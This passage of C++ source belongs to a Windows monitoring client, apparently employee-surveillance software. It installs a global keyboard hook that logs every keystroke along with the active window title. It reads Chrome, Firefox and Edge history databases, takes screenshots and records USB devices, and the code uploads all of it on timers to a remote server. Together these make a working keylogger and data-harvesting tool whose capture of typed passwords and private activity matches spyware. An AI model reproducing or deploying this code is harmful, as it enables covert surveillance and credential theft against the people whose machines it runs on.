    data["BrowserHistories"] = Json::Value(Json::arrayValue);
    
    for (const auto& history : browserHistories) {
        data["BrowserHistories"].append(history);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            std::lock_guard<std::mutex> lock(dataMutex);
            browserHistories.clear();
            
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastHistoryStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            writeDebugLog("Browser history uploaded successfully");
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        } else if (root.isMember("error")) {
            std::string errorMsg = root["error"].asString();
            writeDebugLog("Browser history upload error: " + errorMsg);
        }
    }
    else {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastHistoryStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Browser history upload failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Send key logs
bool sendKeyLogs() {
    if (keyLogs.empty() || selectedMonitorId.load()<1) return true;
    
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "KeyLog";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["MonitorId"] = selectedMonitorId.load();
    data["Username"] = username;
    data["KeyLogs"] = Json::Value(Json::arrayValue);
    
    for (const auto& keyLog : keyLogs) {
        data["KeyLogs"].append(keyLog);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            std::lock_guard<std::mutex> lock(dataMutex);
            keyLogs.clear();
            
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastKeyLogStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            writeDebugLog("Key logs uploaded successfully");
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        } else if (root.isMember("error")) {
            std::string errorMsg = root["error"].asString();
            writeDebugLog("Key log upload error: " + errorMsg);
        }
    }
    else {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastKeyLogStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Key log upload failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Send USB logs
bool sendUSBLogs() {
    if (usbDeviceLogs.empty()) return true;
    
    std::cout << "Sending " << usbDeviceLogs.size() << " USB logs" << std::endl;
    
    // Write to log file
    writeDebugLog("Sending " + std::to_string(usbDeviceLogs.size()) + " USB logs to server");
    
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "USBLog";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["MonitorId"] = selectedMonitorId.load();
    data["Username"] = username;
    data["USBLogs"] = Json::Value(Json::arrayValue);
    
    for (const auto& usbLog : usbDeviceLogs) {
        data["USBLogs"].append(usbLog);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::cout << "USB Log JSON: " << jsonData << std::endl;
    
    std::string response = httpPost(url, jsonData);
    
    std::cout << "USB Log Response: " << response << std::endl;
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            std::lock_guard<std::mutex> lock(dataMutex);
            usbDeviceLogs.clear();
            
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastUSBLogStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            writeDebugLog("USB logs uploaded successfully");
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        } else if (root.isMember("error")) {
            std::string errorMsg = root["error"].asString();
            writeDebugLog("USB log upload error: " + errorMsg);
        }
    }
    else {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastUSBLogStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "USB log upload failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Update username on server
bool updateUsername(const std::string& newUsername) {
    std::string url = API_BASE_URL + API_ROUTE + "?type=username";
    
    Json::Value data;
    data["username"] = newUsername;
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            username = newUsername;  // Update local username
            // Username updated successfully
            return true;
        } else if (root.isMember("error")) {
            std::string errorMsg = root["error"].asString();
            // Username update error
        }
    }
    
    // Failed to update username
    return false;
}

// HTTP POST request - optimized with shorter timeouts
std::string httpPost(const std::string& url, const std::string& data) {
    HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return "";
    }
    
    // Set shorter timeouts to prevent long blocking (5 seconds max)
    DWORD timeout = 5000; // 5 seconds - reduced from 10
    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    
    // Parse URL to get host and path
    URL_COMPONENTSA urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = -1;
    urlComp.dwHostNameLength = -1;
    urlComp.dwUrlPathLength = -1;
    urlComp.dwExtraInfoLength = -1;
    urlComp.dwExtraInfoLength = -1;
    
    if (!InternetCrackUrlA(url.c_str(), 0, 0, &urlComp)) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    std::string hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if(urlComp.dwExtraInfoLength)urlPath.append(urlComp.lpszExtraInfo,urlComp.dwExtraInfoLength);
    
    // Connecting to host
    
    // Connect to host
    HINTERNET hConnect = InternetConnectA(hInternet, hostName.c_str(), 
                                        urlComp.nPort == INTERNET_INVALID_PORT_NUMBER ? INTERNET_DEFAULT_HTTP_PORT : urlComp.nPort,
                                        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Open request
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath.c_str(), NULL, NULL, NULL, 
                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | (urlComp.nScheme==INTERNET_SCHEME_HTTPS?INTERNET_FLAG_SECURE:0), 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Set headers
    std::string headers = "Content-Type: application/json\r\n";
    std::string tokenCopy=getClientToken();
    if(!tokenCopy.empty())headers += "Authorization: Bearer "+tokenCopy+"\r\n";
    HttpAddRequestHeadersA(hRequest, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
    
    // Send request
    BOOL result = HttpSendRequestA(hRequest, NULL, 0, (LPVOID)data.c_str(), data.length());
    
    std::string response;
    if (result) {
        char buffer[1024];
        DWORD bytesRead;
        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }
        // HTTP request successful
    } else {
        // Failed to send HTTP request
    }
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return response;
}

// HTTP POST file upload
std::string httpPostFile(const std::string& url, const std::string& filePath) {
    HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";
    
    // Parse URL to get host and path
    URL_COMPONENTSA urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = -1;
    urlComp.dwHostNameLength = -1;
    urlComp.dwUrlPathLength = -1;
    
    if (!InternetCrackUrlA(url.c_str(), 0, 0, &urlComp)) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    std::string hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    
    // Connect to host
    HINTERNET hConnect = InternetConnectA(hInternet, hostName.c_str(), 
                                        urlComp.nPort == INTERNET_INVALID_PORT_NUMBER ? INTERNET_DEFAULT_HTTP_PORT : urlComp.nPort,
                                        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Read file
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }
    
    std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    // Create multipart form data
    std::string boundary = "----WebKitFormBoundary" + std::to_string(GetTickCount());
    std::string contentType = "multipart/form-data; boundary=" + boundary;
    
    std::string formData = "--" + boundary + "\r\n";
    formData += "Content-Disposition: form-data; name=\"imagefile\"; filename=\"" + filePath + "\"\r\n";
    formData += "Content-Type: image/jpeg\r\n\r\n";
    formData += fileContent + "\r\n";
    
    // Add computer name to form data
    formData += "--" + boundary + "\r\n";
    formData += "Content-Disposition: form-data; name=\"com_name\"\r\n\r\n";
    formData += username + "\r\n";
    
    // Include the selected monitor ID; backend checks it against the token.
    formData += "--" + boundary + "\r\n";
    formData += "Content-Disposition: form-data; name=\"monitor_id\"\r\n\r\n";
    formData += std::to_string(selectedMonitorId.load()) + "\r\n";
    // Add capture time to form data
    formData += "--" + boundary + "\r\n";
    formData += "Content-Disposition: form-data; name=\"ctime\"\r\n\r\n";
    formData += getCurrentDateTimeString() + "\r\n";
    
    formData += "--" + boundary + "--\r\n";
    
    // Create HTTP request
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath.c_str(), NULL, NULL, NULL, 
                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | (urlComp.nScheme==INTERNET_SCHEME_HTTPS?INTERNET_FLAG_SECURE:0), 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Set headers
    std::string headers = "Content-Type: " + contentType + "\r\n";
    std::string tokenCopy=getClientToken();
    if(!tokenCopy.empty())headers += "Authorization: Bearer "+tokenCopy+"\r\n";
    HttpAddRequestHeadersA(hRequest, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
    
    // Send request
    BOOL result = HttpSendRequestA(hRequest, NULL, 0, (LPVOID)formData.c_str(), formData.length());
    
    std::string response;
    if (result) {
        char buffer[1024];
        DWORD bytesRead;
        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }
    }
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return response;
}

// Keyboard hook procedure - optimized to reduce blocking
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
            
            // Prepare data outside of critical section
            std::string application = getActiveWindowTitle();
            std::string keyName = getKeyName(kbStruct->vkCode, kbStruct->scanCode, kbStruct->flags);
            std::string timestamp = getCurrentDateTimeString();
            
            // Check for modifier keys
            std::string modifiers;
            if (GetAsyncKeyState(VK_CONTROL) & 0x8000) modifiers += "Ctrl+";
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) modifiers += "Shift+";
            if (GetAsyncKeyState(VK_MENU) & 0x8000) modifiers += "Alt+";
            if (GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000) modifiers += "Win+";
            
            std::string fullKeyName = modifiers + keyName;
            
            // Create key log entry
            Json::Value keyLog;
            keyLog["date"] = timestamp;
            keyLog["application"] = application;
            keyLog["key"] = fullKeyName;
            
            // Minimize time spent in critical section
            bool shouldManageMemory = false;
            {
                std::lock_guard<std::mutex> lock(dataMutex);
                keyLogs.push_back(keyLog);
                
                // Check memory limits less frequently to reduce overhead
                if (keyLogs.size() % 50 == 0) { // Reduced from 100
                    shouldManageMemory = true;
                }
            }
            
            // Manage memory outside of critical section
            if (shouldManageMemory) {
                manageMemoryLimits();
            }
        }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Setup keyboard hook
void setupKeyboardHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        std::cerr << "Failed to set keyboard hook" << std::endl;
    }
}

// Remove keyboard hook
void removeKeyboardHook() {
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }
}

// Collect browser history (optimized)
void collectBrowserHistory() {
    // Chrome history
    std::string chromeHistory = getChromeHistory(lastChromeFetch);
    if (!chromeHistory.empty()) {
        Json::Value historyArray;
        Json::Reader reader;
        if (reader.parse(chromeHistory, historyArray)) {
            int64_t maxTime = lastChromeFetch;
            std::vector<Json::Value> newHistories;
            
            for (const auto& entry : historyArray) {
                Json::Value history;
                history["browser"] = "Chrome";
                history["url"] = entry["url"];
                history["title"] = entry["title"];
                history["last_visit"] = entry["last_visit"];
                history["date"] = getCurrentDateTimeString();
                
                // Track the latest time we've seen
                int64_t visitTime = entry["last_visit"].asInt64();
                if (visitTime > maxTime) {
                    maxTime = visitTime;
                }
                
                newHistories.push_back(history);
            }
            
            // Batch add to avoid frequent lock acquisitions
            if (!newHistories.empty()) {
                std::lock_guard<std::mutex> lock(dataMutex);
                browserHistories.insert(browserHistories.end(), newHistories.begin(), newHistories.end());
                
                // Check memory limits
                if (browserHistories.size() > MAX_BROWSER_HISTORIES) {
                    manageMemoryLimits();
                }
            }
            
            // Update the last fetch time
            if (maxTime > lastChromeFetch) {
                lastChromeFetch = maxTime;
                // Updated Chrome last fetch time
            }
        }
    }
    
    // Firefox history
    std::string firefoxHistory = getFirefoxHistory(lastFirefoxFetch);
    if (!firefoxHistory.empty()) {
        Json::Value historyArray;
        Json::Reader reader;
        if (reader.parse(firefoxHistory, historyArray)) {
            int64_t maxTime = lastFirefoxFetch;
            for (const auto& entry : historyArray) {
                Json::Value history;
                history["browser"] = "Firefox";
                history["url"] = entry["url"];
                history["title"] = entry["title"];
                history["last_visit"] = entry["last_visit"];
                history["date"] = getCurrentDateTimeString();
                
                // Track the latest time we've seen
                int64_t visitTime = entry["last_visit"].asInt64();
                if (visitTime > maxTime) {
                    maxTime = visitTime;
                }
                
                std::lock_guard<std::mutex> lock(dataMutex);
                browserHistories.push_back(history);
            }
            // Update the last fetch time
            if (maxTime > lastFirefoxFetch) {
                lastFirefoxFetch = maxTime;
                // Updated Firefox last fetch time
            }
        }
    }
    
    // Edge history
    std::string edgeHistory = getEdgeHistory(lastEdgeFetch);
    if (!edgeHistory.empty()) {
        Json::Value historyArray;
        Json::Reader reader;
        if (reader.parse(edgeHistory, historyArray)) {
            int64_t maxTime = lastEdgeFetch;
            for (const auto& entry : historyArray) {
                Json::Value history;
                history["browser"] = "Edge";
                history["url"] = entry["url"];
                history["title"] = entry["title"];
                history["last_visit"] = entry["last_visit"];
                history["date"] = getCurrentDateTimeString();
                
                // Track the latest time we've seen
                int64_t visitTime = entry["last_visit"].asInt64();
                if (visitTime > maxTime) {
                    maxTime = visitTime;
                }
                
                std::lock_guard<std::mutex> lock(dataMutex);
                browserHistories.push_back(history);
            }
            // Update the last fetch time
            if (maxTime > lastEdgeFetch) {
                lastEdgeFetch = maxTime;
                // Updated Edge last fetch time
            }
        }
    }
}

// Get Chrome history
std::string getChromeHistory(int64_t sinceTime) {
#ifdef _MSC_VER
    char* localAppData;
    size_t len;
    _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
    if (!localAppData) return "";
    std::string chromePath = std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default\\History";
    free(localAppData);
#else
    const char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) return "";
    std::string chromePath = std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default\\History";
#endif
    
    // Create a temporary copy of the database to avoid locking issues
    std::string tempPath = "temp_chrome_history.db";
    if (!CopyFileA(chromePath.c_str(), tempPath.c_str(), FALSE)) {
        // If copy fails, try to access the original
        tempPath = chromePath;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query;
    if (sinceTime > 0) {
        query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > " + std::to_string(sinceTime) + " ORDER BY last_visit_time DESC LIMIT 100";
        // Chrome query with sinceTime
    } else {
        query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
        // Chrome query without sinceTime (first run)
    }
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            const char* url = (char*)sqlite3_column_text(stmt, 0);
            const char* title = (char*)sqlite3_column_text(stmt, 1);
            
            if (url && title) {
                entry["url"] = url;
                entry["title"] = title;
                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
                historyArray.append(entry);
            }
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    // Clean up temporary file
    if (tempPath != chromePath) {
        DeleteFileA(tempPath.c_str());
    }
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Get Firefox history
std::string getFirefoxHistory(int64_t sinceTime) {
#ifdef _MSC_VER
    char* appData;
    size_t len;
    _dupenv_s(&appData, &len, "APPDATA");
    if (!appData) return "";
    std::string firefoxPath = std::string(appData) + "\\Mozilla\\Firefox\\Profiles";
    free(appData);
#else
    const char* appData = getenv("APPDATA");
    if (!appData) return "";
    std::string firefoxPath = std::string(appData) + "\\Mozilla\\Firefox\\Profiles";
#endif
    
    // Find all profiles, prefer default profile
    std::string profilePath;
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((firefoxPath + "\\*.default*").c_str(), &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        // Found default profile
        profilePath = firefoxPath + "\\" + findData.cFileName + "\\places.sqlite";
        FindClose(hFind);
    } else {
        // Try to find any profile
        hFind = FindFirstFileA((firefoxPath + "\\*").c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    std::string testPath = firefoxPath + "\\" + findData.cFileName + "\\places.sqlite";
                    if (GetFileAttributesA(testPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                        profilePath = testPath;
                        break;
                    }
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }
    }
    
    if (profilePath.empty()) {
        return "";
    }
    
    // Create a temporary copy of the database to avoid locking issues
    std::string tempPath = "temp_firefox_history.db";
    if (!CopyFileA(profilePath.c_str(), tempPath.c_str(), FALSE)) {
        // If copy fails, try to access the original
        tempPath = profilePath;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query;
    if (sinceTime > 0) {
        query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL AND last_visit_date > " + std::to_string(sinceTime) + " ORDER BY last_visit_date DESC LIMIT 100";
        // Firefox query with sinceTime
    } else {
        query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 100";
        // Firefox query without sinceTime (first run)
    }
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            const char* url = (char*)sqlite3_column_text(stmt, 0);
            const char* title = (char*)sqlite3_column_text(stmt, 1);
            
            if (url && title) {
                entry["url"] = url;
                entry["title"] = title;
                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
                historyArray.append(entry);
            }
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    // Clean up temporary file
    if (tempPath != profilePath) {
        DeleteFileA(tempPath.c_str());
    }
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Get Edge history
std::string getEdgeHistory(int64_t sinceTime) {
#ifdef _MSC_VER
    char* localAppData;
    size_t len;
    _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
    if (!localAppData) return "";
    std::string edgePath = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default\\History";
    free(localAppData);
#else
    const char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) return "";
    std::string edgePath = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default\\History";
#endif
    
    // Create a temporary copy of the database to avoid locking issues
    std::string tempPath = "temp_edge_history.db";
    if (!CopyFileA(edgePath.c_str(), tempPath.c_str(), FALSE)) {
        // If copy fails, try to access the original
        tempPath = edgePath;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query;
    if (sinceTime > 0) {
        query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > " + std::to_string(sinceTime) + " ORDER BY last_visit_time DESC LIMIT 100";
        // Edge query with sinceTime
    } else {
        query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
        // Edge query without sinceTime (first run)
    }
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            const char* url = (char*)sqlite3_column_text(stmt, 0);
            const char* title = (char*)sqlite3_column_text(stmt, 1);
            
            if (url && title) {
                entry["url"] = url;
                entry["title"] = title;
                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
                historyArray.append(entry);
            }
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    // Clean up temporary file
    if (tempPath != edgePath) {
        DeleteFileA(tempPath.c_str());
    }
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Main monitoring task - optimized to prevent blocking
void monitorTask() {
    auto lastScreenshot = std::chrono::steady_clock::now();
    auto lastTic = std::chrono::steady_clock::now();
    auto lastHistory = std::chrono::steady_clock::now();
    auto lastKeyLog = std::chrono::steady_clock::now();
    auto lastUSBLog = std::chrono::steady_clock::now();
    auto lastConnectionTest = std::chrono::steady_clock::now();
    auto lastMemoryCheck = std::chrono::steady_clock::now();

    std::this_thread::sleep_for(std::chrono::seconds(5));
    
    // Test initial connection
    if (!testServerConnection()) {
        showConnectionError("Cannot connect to server: " + API_BASE_URL);
    }

    // Send initial data requests within 5 seconds of startup
    if(selectedMonitorId.load()>0)sendInitialDataRequests();
    
    while (activeRunning) {
        if(selectedMonitorId.load()<1){std::this_thread::sleep_for(std::chrono::seconds(1));continue;}
        auto now = std::chrono::steady_clock::now();
        
        // Test connection every 120 seconds (reduced frequency)
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastConnectionTest).count() >= 120) {
            std::thread([]() { testServerConnection(); }).detach();
            lastConnectionTest = now;
        }
        
        // Screenshot - run in separate thread to prevent blocking
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastScreenshot).count() >= screenInterval) {
            std::thread([]() {
                std::string screenshotPath = takeScreenshot();
                sendScreenshot(screenshotPath);
            }).detach();
            lastScreenshot = now;
        }
        
        // Tic event (using dynamic interval from server) - run in separate thread
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastTic).count() >= ticInterval) {
            std::thread([]() { sendTicEvent(); }).detach();
            lastTic = now;
        }
        
        // Browser history - run in separate thread (using configurable interval)
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastHistory).count() >= historyInterval) {
            std::thread([]() {
                collectBrowserHistory();
                sendBrowserHistories();
            }).detach();
            lastHistory = now;
        }
        
        // Key logs - run in separate thread (using configurable interval)
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastKeyLog).count() >= keyInterval) {
            std::thread([]() { sendKeyLogs(); }).detach();
            lastKeyLog = now;
        }
        
        // USB logs - run in separate thread (using configurable interval)
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastUSBLog).count() >= usbInterval) {
            std::thread([]() { sendUSBLogs(); }).detach();
            lastUSBLog = now;
        }
        
        // Memory management check every 2 minutes (more frequent)
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastMemoryCheck).count() >= 120) {
            manageMemoryLimits();
            cleanupTemporaryFiles(); // Also clean up temporary files
            lastMemoryCheck = now;
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(500)); // Reduced sleep time for more responsive checking
    }
}



static std::string settingsFilePath() {
    char fullPath[MAX_PATH] = {0};
    GetFullPathNameA("settings.ini",MAX_PATH,fullPath,nullptr);
    return fullPath;
}
static void saveClientSetting(const char* section,const char* key,const std::string& value) {
    const std::string path=settingsFilePath();
    WritePrivateProfileStringA(section,key,value.c_str(),path.c_str());
}
static std::string credentialTarget() {
    return "ACC-Monitor-v1.4/" + serverIP + ":" + serverPort;
}
static void rememberClientToken(const std::string& token) {
    const std::string target=credentialTarget();
    CREDENTIALA cred={};
    cred.Type=CRED_TYPE_GENERIC;
    cred.TargetName=const_cast<char*>(target.c_str());
    cred.CredentialBlobSize=static_cast<DWORD>(token.size());
    cred.CredentialBlob=(LPBYTE)token.data();
    cred.Persist=CRED_PERSIST_LOCAL_MACHINE;
    cred.UserName=const_cast<char*>("ACC Monitor Client");
    if (!CredWriteA(&cred,0))
        showToastNotification("Session storage","Windows Credential Manager could not store the session.","error");
}
static std::string readClientToken() {
    const std::string target=credentialTarget();
    PCREDENTIALA cred=nullptr;
    std::string token;
    if(CredReadA(target.c_str(),CRED_TYPE_GENERIC,0,&cred) && cred){
        token.assign(reinterpret_cast<const char*>(cred->CredentialBlob),cred->CredentialBlobSize);
        CredFree(cred);
    }
    return token;
}
static Json::Value callClientAuth(const Json::Value& body) {
    Json::Value result;Json::CharReaderBuilder builder;std::string errors;
    std::istringstream input(httpPost(API_BASE_URL+"/client_auth.php",Json::FastWriter().write(body)));
    if(!Json::parseFromStream(builder,input,&result,&errors))result=Json::objectValue;
    return result;
}
bool restoreClientSession() {
    const std::string saved=readClientToken();
    if(saved.size()!=64) return false;
    {std::lock_guard<std::mutex> guard(authMutex);clientToken=saved;}
    Json::Value req;req["action"]="restore";
    const Json::Value answer=callClientAuth(req);
    if(!answer.get("success",false).asBool()){
        {std::lock_guard<std::mutex> guard(authMutex);clientToken.clear();}
        return false;
    }
    signedInUsername=answer["user"].get("username","").asString();
    selectedMonitorId.store(answer.get("monitor_id",0).asInt());
    if(selectedMonitorId.load()>0){
        if(!keyboardHook) setupKeyboardHook();
        if(!usbMonitoringActive)setupUSBMONITORING();
    }
    updateTrayIcon();
    return true;
}
static std::string editText(HWND dlg,int id) {
    char buffer[1100]={0};
    GetDlgItemTextA(dlg,id,buffer,sizeof(buffer));
    return std::string(buffer);
}
enum {
    AUTH_TABS=4100,AUTH_USER=4101,AUTH_PASS=4102,AUTH_CONFIRM=4103,
    AUTH_CONFIRM_LABEL=4104,AUTH_SUBMIT=4105,AUTH_SERVER=4106,
    SETTINGS_USER=4200,SETTINGS_IP=4201,SETTINGS_PORT=4202,
    SETTINGS_MONITOR=4203,SETTINGS_LABEL=4204,SETTINGS_OS=4205,
    SETTINGS_MACHINE=4206,SETTINGS_REMARK=4207,
    SETTINGS_NOTIFY=4208,SETTINGS_SAVE=4209,SETTINGS_LOGOUT=4210
};
static HWND addControl(HWND parent,const char* cls,const char* label,DWORD style,
                       int x,int y,int width,int height,int id) {
    return CreateWindowExA(0,cls,label,WS_CHILD|WS_VISIBLE|style,
        x,y,width,height,parent,(HMENU)(INT_PTR)id,GetModuleHandleA(NULL),nullptr);
}
static bool currentSignupTab(HWND dlg) {
    return TabCtrl_GetCurSel(GetDlgItem(dlg,AUTH_TABS))==1;
}
static void updateAuthTab(HWND dlg) {
    const bool signup=currentSignupTab(dlg);
    ShowWindow(GetDlgItem(dlg,AUTH_CONFIRM),signup?SW_SHOW:SW_HIDE);
    ShowWindow(GetDlgItem(dlg,AUTH_CONFIRM_LABEL),signup?SW_SHOW:SW_HIDE);
    SetWindowTextA(GetDlgItem(dlg,AUTH_SUBMIT),signup?"Sign Up":"Sign In");
}
